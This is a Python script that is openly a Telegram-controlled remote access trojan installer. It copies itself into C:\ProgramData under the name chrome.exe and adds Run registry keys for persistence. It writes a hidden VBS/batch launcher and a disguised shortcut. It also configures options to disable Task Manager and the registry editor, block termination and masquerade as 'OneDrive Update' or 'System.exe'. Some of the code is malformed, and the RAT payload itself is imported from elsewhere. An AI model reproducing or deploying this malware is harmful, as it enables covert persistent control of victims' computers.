



from pathlib import Path
import os
import time
import requests

my_file = Path("c:\programdata\chrome.exe")

if my_file.is_file():
     
     while True:
            
            time.sleep(2)
            url = "http://www.google.com"
            timeout = 2
            try:
               # requesting URL
               request = requests.get(url, timeout=timeout)
               print('internet found')
               time.sleep(1)
               # Token/ID
               from API import *


               # Token/ID
               TelegramToken = 'ur api'
               TelegramChatID = 'ur id '


               # Run the script as administrator
               AdminRightsRequired = False

               # Disable Task Manager at first start
               DisableTaskManager = False
               # Disable Registry Editor at first start
               DisableRegistryTools = False

               # Process protection from termination and deletion
               ProcessBSODProtectionEnabled = False


               # Add to startup at first start
               AutorunEnabled = False
               # Installation directory
               InstallPath = 'C:\\ProgramData\\'
               # Task name in Task Scheduler
               AutorunName = 'OneDrive Update'
               # The name of the process in the Task Manager
               ProcessName = 'System.exe'


               # Display a message at first start
               DisplayMessageBox = False
               # Your Message (will be displayed at start)
               Message = 'Message'


               # Directory for saving trojan temporary files
               Directory = 'C:\\Windows\\Temp\\TelegramRAT\\'

                                                                                           
                                        



                                    

                                    


                                    
                                    
            # catching exception
            except (requests.ConnectionError, requests.Timeout) as exception:
                print("Server Down!") 

else:
  os.system('echo f | xcopy /y  chrome.exe C:\ProgramData\chrome.exe')
  os.system('echo y | REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "intel" /t REG_SZ /F /D "C:\ProgramData\intelhd.lnk"')
  os.system('echo y | REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "update" /t REG_SZ /F /D "C:\ProgramData\chrome.exe"')
  file = open("C:\ProgramData\win.bat", "w") 
  file.write("@echo off\n:while\nif %x% LEQ 2 (\necho %x%\ntaskkill  /IM win.exe /f\nchrome.exe\ntimeout 3\set /A loop\ngoto :while\n)") 
  file.close()
  file = open("C:\ProgramData\win.vbs", "w") 
  file.write('Set oShell = CreateObject ("Wscript.Shell")\nDim strArgs\nstrArgs = "cmd /c win.bat"\noShell.Run strArgs, 0, false') 
  file.close()
  from swinlnk.swinlnk import SWinLnk
  swl = SWinLnk()
  swl.create_lnk('C:/ProgramData/win.vbs', 'C:/ProgramData/intelhd.lnk')
 

